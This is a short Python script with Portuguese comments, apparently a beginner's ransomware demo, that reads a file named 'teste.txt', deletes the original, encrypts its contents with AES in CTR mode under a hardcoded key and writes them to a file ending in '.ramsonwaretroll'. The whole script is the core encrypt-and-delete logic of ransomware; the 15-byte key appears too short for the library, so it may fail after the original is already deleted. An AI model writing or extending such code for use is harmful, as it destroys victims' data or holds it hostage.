import os
import pyaes

## abrir aquivo original

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## remove arquivo original

os.remove(file_name)

## chave descriptografica

key = b"testeransomware"
aes = pyaes.AESModeOfOperationCTR(key)
encrypt_data = aes.encrypt(file_data)

## cria novo arquivo criptografado

new_file = file_name + '.ramsonwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(encrypt_data)
new_file.close()